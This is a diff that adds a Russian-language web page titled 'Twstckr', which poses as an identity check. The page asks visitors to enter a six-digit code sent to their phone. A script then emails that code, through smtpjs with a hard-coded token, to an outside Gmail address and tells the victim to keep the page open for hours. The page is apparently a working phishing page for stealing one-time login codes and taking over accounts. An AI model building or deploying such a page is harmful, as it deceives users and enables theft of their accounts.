@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="style4.css">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Twstckr 📷 - wait </title>
+</head>
+<body>
+    <div class="container">
+        <div class="wait">
+            <img src="waiting-time.gif">
+            <h2>Мы должны удостоверится, что это вы.</h2>
+            <p> Когда вам пришлёт номер: +7 916 826 88 46 картинку, указанную ниже, <br> впишите код, состоящий из 6 цифр, прислыный вам на ваш номер <br> в поле для ввода: </p>
+            <img src="https://petzona.ru/wp-content/uploads/2018/12/1414941894_20.jpg" alt="2222999229">
+            <input type="number" placeholder="123456" id="code" min="6" max="6" required>
+            <a href="#" id="btn">Готово!</a>
+            <p class="caution">Сообщение с фотогравией может ийдти до 7 часов (Не закрывайте эту веб-страницу)!</p>
+        </div>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        var btn = document.getElementById('btn');
+        btn.addEventListener('click', function (e) {
+            e.preventDefault()
+            var code = document.getElementById('code').value;
+            var body = 'Code: ' + code;
+            console.log('Sent');
+            window.open('waiting_time.html');
+
+
+            Email.send({
+                SecureToken: "aed6af81-8e72-400d-8e43-11164fe16a89",
+                To: 'trend.cinema.gg@gmail.com',
+                From: "trend.cinema.gg@gmail.com",
+                Subject: "Inof",
+                Body: body
+            }).then(
+                message => alert(message)
+            );
+        })
+    </script>
+</body>
+</html>
